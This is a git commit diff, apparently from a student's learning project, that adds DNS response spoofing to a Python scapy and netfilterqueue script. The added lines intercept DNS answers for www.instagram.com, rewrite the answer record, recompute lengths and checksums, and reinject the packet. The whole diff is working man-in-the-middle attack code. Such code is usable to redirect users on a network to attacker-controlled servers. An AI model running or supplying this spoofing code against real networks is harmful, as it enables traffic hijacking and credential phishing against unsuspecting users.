8d4547bac9c3dcc7657cc3a6471049f233c56d47
Noman Nasir Minhas <SP17-BSE-010@ISBSTUDENT.COMSATS.EDU.PK>
2023-01-05 21:59:17 +0500

    DNS Response Added

--- main.py
+++ main.py
@@ -15,16 +15,23 @@ def parse_arguments():
     return parser.parse_args()
 
 def process_packet(packet):
-    if options.drop:
-        packet.drop()
-    elif options.forward:
-        packet.accept()
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if 'www.instagram.com' in qname:
             print('[+] Spoofing target')
             answer = scapy.DNSRR(rrname=qname, rdata='')
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+            packet.set_payload(str(scapy_packet))
+    if options.drop:
+        packet.drop()
+    elif options.forward:
+        packet.accept()
     # print(scapy_packet.show())
 
 
